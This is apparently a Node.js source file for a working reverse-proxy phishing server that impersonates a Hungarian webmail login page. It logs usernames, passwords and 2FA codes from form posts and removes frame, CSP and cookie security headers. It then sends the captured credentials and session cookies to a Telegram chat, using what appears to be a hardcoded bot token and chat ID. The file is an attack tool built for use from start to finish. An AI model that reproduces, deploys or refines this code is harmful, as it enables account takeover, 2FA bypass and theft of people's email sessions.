const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const http = require('http');

const app = express();

// Get config from environment variables (Render sets these)
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TARGET_URL = process.env.TARGET_URL || 'https://accounts.freemail.hu';
const PORT = process.env.PORT || 3000;

console.log('=== CONFIG CHECK ===');
console.log('Token exists:', TELEGRAM_TOKEN ? 'YES' : 'NO');
console.log('Chat ID:', CHAT_ID);
console.log('Target:', TARGET_URL);
console.log('Port:', PORT);
console.log('====================');

if (!TELEGRAM_TOKEN || TELEGRAM_TOKEN === '8257609367:AAGC6iMZTzOsJEYAlqrFGckKN7T-1pMAS2g') {
  console.error('❌ ERROR: TELEGRAM_TOKEN not set!');
}

if (!CHAT_ID || CHAT_ID === '93372553') {
  console.error('❌ ERROR: CHAT_ID not set!');
}

const bot = new TelegramBot(TELEGRAM_TOKEN, {polling: false});
const sessions = new Map();

// Test Telegram connection on startup
bot.sendMessage(CHAT_ID, '🤖 Sam Proxy started and ready!')
  .then(() => console.log('✅ Telegram test message sent!'))
  .catch(err => console.error('❌ Telegram test failed:', err.message));

function getClientId(req) {
  return (req.headers['x-forwarded-for'] || req.ip) + (req.headers['user-agent'] || '');
}

function getSession(req) {
  const id = getClientId(req);
  if (!sessions.has(id)) {
    sessions.set(id, {
      username: null,
      password: null,
      twofaCode: null,
      sessionToken: null,
      stage: 0
    });
  }
  return sessions.get(id);
}

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// DEBUG: Log every single request
app.use((req, res, next) => {
  const session = getSession(req);
  
  console.log(`\n[${new Date().toLocaleTimeString()}] ${req.method} ${req.url}`);
  console.log('Stage:', session.stage);
  console.log('Body:', JSON.stringify(req.body));
  
  if (req.method === 'POST' && req.body) {
    const body = req.body;
    
    // Check ALL possible field names
    const possibleFields = Object.keys(body);
    console.log('Fields in request:', possibleFields);
    
    // Try to find username
    for (let key of possibleFields) {
      if (['username', 'email', 'user', 'login', 'id', 'account', 'identifier', 'name'].includes(key.toLowerCase())) {
        if (body[key]) {
          session.username = body[key];
          session.stage = 1;
          console.log('✅ CAPTURED USERNAME:', body[key]);
        }
      }
      
      if (['password', 'passwd', 'pass', 'pwd', 'secret', 'password1'].includes(key.toLowerCase())) {
        if (body[key]) {
          session.password = body[key];
          session.stage = 2;
          console.log('✅ CAPTURED PASSWORD');
        }
      }
      
      if (['code', 'otp', 'twofa', '2fa', 'verificationcode', 'token', 'pin', 'totp'].includes(key.toLowerCase())) {
        if (body[key]) {
          session.twofaCode = body[key];
          session.stage = 3;
          console.log('✅ CAPTURED 2FA');
        }
      }
    }
  }
  
  next();
});

const proxy = createProxyMiddleware({
  target: TARGET_URL,
  changeOrigin: true,
  secure: false,
  ws: true,
  followRedirects: false,
  
  cookieDomainRewrite: { '*': '' },
  
  onProxyReq: (proxyReq, req, res) => {
    try {
      proxyReq.setHeader('Referer', TARGET_URL);
      proxyReq.setHeader('Origin', TARGET_URL);
    } catch (e) {}
  },
  
  onProxyRes: (proxyRes, req, res) => {
    const session = getSession(req);
    
    delete proxyRes.headers['x-frame-options'];
    delete proxyRes.headers['content-security-policy'];
    
    console.log('Response status:', proxyRes.statusCode);
    console.log('Response headers:', JSON.stringify(proxyRes.headers['set-cookie'] || 'no cookies'));
    
    if (proxyRes.headers['set-cookie']) {
      const cookies = proxyRes.headers['set-cookie'];
      
      proxyRes.headers['set-cookie'] = cookies.map(cookie => {
        return cookie
          .replace(/Domain=[^;]+;?/gi, '')
          .replace(/SameSite=[^;]+;?/gi, '')
          .replace(/Secure;?/gi, '');
      });
      
      console.log('Modified cookies:', cookies);
      
      // Send to Telegram if we have username AND password
      if (session.username && session.password) {
        const message = `🎉 *LOGIN CAPTURED!*\n\n` +
          `👤 *Username:* \`${session.username}\`\n` +
          `🔑 *Password:* \`${session.password}\`\n` +
          `🔢 *2FA:* \`${session.twofaCode || 'N/A'}\`\n\n` +
          `🍪 *Cookies:*\n\`\`\`\n${cookies.join('\n')}\n\`\`\``;
        
        console.log('🚀 SENDING TO TELEGRAM...');
        
        bot.sendMessage(CHAT_ID, message, {parse_mode: 'Markdown'})
          .then(() => console.log('✅ SENT TO TELEGRAM!'))
          .catch(err => {
            console.error('❌ TELEGRAM ERROR:', err.message);
            console.error('Token valid?', TELEGRAM_TOKEN ? 'Yes' : 'No');
            console.error('Chat ID valid?', CHAT_ID ? 'Yes' : 'No');
          });
      } else {
        console.log('⚠️ Not sending to Telegram - missing username or password');
        console.log('Username:', session.username);
        console.log('Password:', session.password ? 'Yes (hidden)' : 'No');
      }
    }
  },
  
  onError: (err, req, res) => {
    console.error('Proxy Error:', err.message);
    if (!res.headersSent) {
      res.status(502).send('Proxy error');
    }
  }
});

// Manual test endpoint
app.get('/test-telegram', (req, res) => {
  bot.sendMessage(CHAT_ID, '🔔 Test message from Sam Proxy!')
    .then(() => res.send('Test message sent! Check Telegram.'))
    .catch(err => res.send('Error: ' + err.message));
});

app.get('/health', (req, res) => {
  res.json({status: 'ok', sessions: sessions.size});
});

app.use('/', proxy);

const server = http.createServer(app);

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n🎭 SAM RUNNING on port ${PORT}`);
  console.log(`Visit: https://your-app.onrender.com/test-telegram to test Telegram\n`);
});
